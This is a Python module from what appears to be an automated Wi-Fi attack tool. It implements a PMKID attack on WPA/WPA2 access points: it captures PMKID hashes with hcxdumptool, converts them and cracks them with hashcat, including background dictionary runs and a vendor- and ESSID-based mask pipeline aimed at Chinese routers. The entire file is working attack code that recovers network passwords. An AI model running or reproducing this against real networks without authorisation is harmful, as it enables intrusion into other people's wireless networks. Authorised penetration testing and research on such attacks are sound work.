#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PMKID 攻击 (clientless / RSN IE)

现代流程 (2024–2026 Kali):
  hcxdumptool → pcapng → hcxpcapngtool → WPA*01*... (hc22000)
  hashcat -m 22000

参考:
  - https://hashcat.net/forum/thread-7717.html (PMKID 披露)
  - https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
  - NCC Group: PMKID 并非仅限 802.11r
"""

from ..model.attack import Attack
from ..config import Configuration
from ..tools.hashcat import HcxDumpTool, HcxPcapTool, Hashcat
from ..util.color import Color
from ..util.i18n import t
from ..util.timer import Timer
from ..model.pmkid_result import CrackResultPMKID

from threading import Thread
import os
import time
import re


class AttackPMKID(Attack):

    def __init__(self, target):
        super(AttackPMKID, self).__init__(target)
        self.crack_result = None
        self.success = False
        self.pcapng_file = Configuration.temp('pmkid.pcapng')

    def get_existing_pmkid_file(self, bssid):
        """加载 hs/ 下已有有效 PMKID/22000；多份时相同取一、不同取最新。"""
        from ..util.capture_select import select_pmkid_file, list_pmkid_files
        from ..util.i18n import t as _t

        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None
        all_files = list_pmkid_files(Configuration.wpa_handshake_dir, bssid)
        best = select_pmkid_file(Configuration.wpa_handshake_dir, bssid)
        if best is None:
            if all_files:
                Color.pl('{!} {O}%s{W}' % _t('cap.none_valid', len(all_files)))
            return None
        if len(all_files) > 1:
            Color.pl('{+} {D}%s{W}' % _t(
                'cap.pick', len(all_files), os.path.basename(best)))
        return best

    def run(self):
        from ..util.process import Process
        missing = []
        if not Process.exists('hashcat'):
            missing.append('hashcat')
        if not Process.exists('hcxdumptool'):
            missing.append('hcxdumptool')
        if not HcxPcapTool.exists():
            missing.append('hcxpcapngtool')
        if missing:
            Color.pl('{!} {O}%s{W}' % t('pmkid.skip', ', '.join(missing)))
            Color.pl('{!} {O}%s{W}' % t('pmkid.install'))
            return False

        pmkid_file = None
        if Configuration.ignore_old_handshakes is False:
            pmkid_file = self.get_existing_pmkid_file(self.target.bssid)
            if pmkid_file is not None:
                Color.pattack('PMKID', self.target, 'CAPTURE',
                              t('pmkid.exist', pmkid_file) + '\n')

        if pmkid_file is None:
            pmkid_file = self.capture_pmkid()

        if pmkid_file is None:
            return False

        try:
            self.success = self.crack_pmkid_file(pmkid_file)
        except KeyboardInterrupt:
            Color.pl('\n{!} {R}%s{W}' % t('pmkid.interrupted'))
            self.success = False
            return False

        # 只有破解成功才停止后续攻击；仅抓到哈希时继续尝试 WPA 握手路径。
        return self.success

    def capture_pmkid(self):
        self.keep_capturing = True
        self.timer = Timer(Configuration.pmkid_timeout)

        # 注意：不可命名为 t，会遮蔽 util.i18n.t
        dump_thread = Thread(target=self.dumptool_thread)
        dump_thread.daemon = True
        dump_thread.start()

        pmkid_hash = None
        pcaptool = HcxPcapTool(self.target)
        while self.timer.remaining() > 0:
            # 路径总截止：提前结束捕获，把剩余时间留给爆破
            if getattr(Configuration, 'path_deadline', None) is not None:
                if time.time() >= Configuration.path_deadline:
                    break
            pmkid_hash = pcaptool.get_pmkid_hash(self.pcapng_file)
            if pmkid_hash is not None:
                break
            Color.pattack('PMKID', self.target, 'CAPTURE',
                          t('pmkid.wait', str(self.timer)))
            time.sleep(1)

        self.keep_capturing = False
        dump_thread.join(timeout=3)

        if pmkid_hash is None:
            Color.pattack('PMKID', self.target, 'CAPTURE',
                          '{R}%s{W}\n' % t('pmkid.fail'))
            Color.pl('{!} {O}%s{W}' % t('pmkid.hint'))
            Color.pl('')
            return None

        Color.clear_entire_line()
        Color.pattack('PMKID', self.target, 'CAPTURE', '{G}%s{W}' % t('pmkid.ok'))
        saved = self.save_pmkid(pmkid_hash)
        if not saved:
            return None
        return saved

    def crack_pmkid_file(self, pmkid_file):
        if Configuration.wordlist is None:
            Color.pl('\n{!} {O}%s{W}' % t('pmkid.no_wordlist'))
            return False

        from ..tools.bg_crack import BgCrack
        from ..util.capture_select import (
            select_pmkid_file, is_valid_pmkid_file, read_valid_hc22000_lines,
        )

        # 同 AP 多哈希：有效优先，不同取最新
        best = select_pmkid_file(Configuration.wpa_handshake_dir, self.target.bssid)
        if best:
            pmkid_file = best
        if not is_valid_pmkid_file(pmkid_file, want_bssid=self.target.bssid):
            Color.pl('{!} {R}%s{W}' % t('cap.invalid_no_crack'))
            return False
        # 爆破前把文件收成仅含有效行（避免脏文件）
        lines = read_valid_hc22000_lines(pmkid_file, want_bssid=self.target.bssid)
        if lines:
            try:
                with open(pmkid_file, 'w', encoding='utf-8') as fh:
                    fh.write('\n'.join(lines) + '\n')
            except OSError:
                pass

        # 1) potfile 瞬时
        key = BgCrack.potfile_check_pmkid(pmkid_file)
        if key:
            Color.clear_entire_line()
            Color.pattack('PMKID', self.target, 'CRACKED',
                          '{C}%s{W}' % t('wpa.ok', key))
            self.crack_result = CrackResultPMKID(
                self.target.bssid, self.target.essid, pmkid_file, key)
            Color.pl('\n')
            self.crack_result.dump()
            return True

        # 2) 默认独立窗口全量字典（捕获已成功，不截断）
        if BgCrack.enabled():
            Color.clear_entire_line()
            Color.pattack('PMKID', self.target, 'CRACK',
                          t('wpa.crack_bg', os.path.basename(Configuration.wordlist)) + '\n')
            meta = BgCrack.spawn_pmkid(
                pmkid_file,
                essid=self.target.essid,
                bssid=self.target.bssid,
            )
            if meta is not None:
                # 旁路爆破；主流程可继续其它路径
                return False
            # 启动失败回落前台

        # 3) 前台（--no-bg-crack 或后台失败；可受预算限制）
        if Hashcat.budget_exhausted():
            return False
        Color.clear_entire_line()
        Color.pattack('PMKID', self.target, 'CRACK',
                      t('wpa.crack', 'hashcat -m 22000') + '\n')
        key = Hashcat.crack_pmkid(pmkid_file)

        if key is None and getattr(Configuration, 'cn_optimize', False):
            if not Hashcat.budget_exhausted():
                key = self._cn_mask_pipeline(pmkid_file)

        if key is None:
            Color.clear_entire_line()
            Color.pattack('PMKID', self.target, '{R}CRACK',
                          '{R}%s{W}\n' % t('pmkid.crack_fail'))
            return False

        Color.clear_entire_line()
        Color.pattack('PMKID', self.target, 'CRACKED', '{C}%s{W}' % t('wpa.ok', key))
        self.crack_result = CrackResultPMKID(
            self.target.bssid, self.target.essid, pmkid_file, key)
        Color.pl('\n')
        self.crack_result.dump()
        return True

    def _cn_mask_pipeline(self, pmkid_file):
        '''国内 WiFi 掩码自动管线：按优先级跑掩码爆破，命中即返回。'''
        from ..util.cn_strategy import recommend_masks
        from ..util.router_advisory import identify_vendor
        vendor = identify_vendor(self.target.bssid) or ''
        masks = recommend_masks(self.target.essid, vendor,
                                limit=getattr(Configuration, 'cn_mask_limit', 4))
        Color.clear_entire_line()
        Color.pattack('PMKID', self.target, 'CN-OPT',
                      t('wpa.cn_run', len(masks)) + '\n')
        for idx, mask in enumerate(masks, 1):
            if Hashcat.budget_exhausted():
                break
            Color.clear_entire_line()
            Color.pattack('PMKID', self.target, 'CN-OPT',
                          'mask {C}%d/%d{W} {D}%s{W} ...\n' % (idx, len(masks), mask))
            key = Hashcat.crack_hc22000_mask(pmkid_file, mask, verbose=False)
            if key:
                return key
        return None

    def dumptool_thread(self):
        dumptool = HcxDumpTool(self.target, self.pcapng_file)
        while self.keep_capturing and dumptool.poll() is None:
            time.sleep(0.5)
        dumptool.interrupt()

    def save_pmkid(self, pmkid_hash):
        from ..util.capture_select import (
            is_valid_hc22000_line, list_pmkid_files, read_valid_hc22000_lines,
            line_fingerprint, select_pmkid_file,
        )

        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        line = (pmkid_hash or '').strip()
        if not is_valid_hc22000_line(line, want_bssid=self.target.bssid):
            Color.pl('{!} {O}%s{W}' % t('cap.invalid_skip_save'))
            return None

        new_fp = line_fingerprint(line)
        for path in list_pmkid_files(Configuration.wpa_handshake_dir, self.target.bssid):
            existing_lines = read_valid_hc22000_lines(path, want_bssid=self.target.bssid)
            if not existing_lines:
                continue
            old_fp = line_fingerprint('\n'.join(sorted(set(existing_lines))))
            # 单行相同 或 文件仅含同一哈希
            if new_fp == line_fingerprint(existing_lines[0]) or new_fp == old_fp:
                if len(existing_lines) == 1 and new_fp == line_fingerprint(existing_lines[0]):
                    Color.pl('{+} {D}%s{W}' % t('cap.same_reuse', os.path.basename(path)))
                    return path

        essid_safe = re.sub(r'[^a-zA-Z0-9]', '', self.target.essid or 'hidden')
        bssid_safe = self.target.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        pmkid_file = 'pmkid_%s_%s_%s.hc22000' % (essid_safe, bssid_safe, date)
        pmkid_file = os.path.join(Configuration.wpa_handshake_dir, pmkid_file)

        Color.p('\n{+} %s ' % t('pmkid.save', pmkid_file))
        with open(pmkid_file, 'w', encoding='utf-8') as fh:
            fh.write(line + '\n')
        Color.pl('')
        best = select_pmkid_file(Configuration.wpa_handshake_dir, self.target.bssid)
        if best and os.path.abspath(best) == os.path.abspath(pmkid_file):
            Color.pl('{+} {D}%s{W}' % t('cap.newest', os.path.basename(best)))
        return pmkid_file
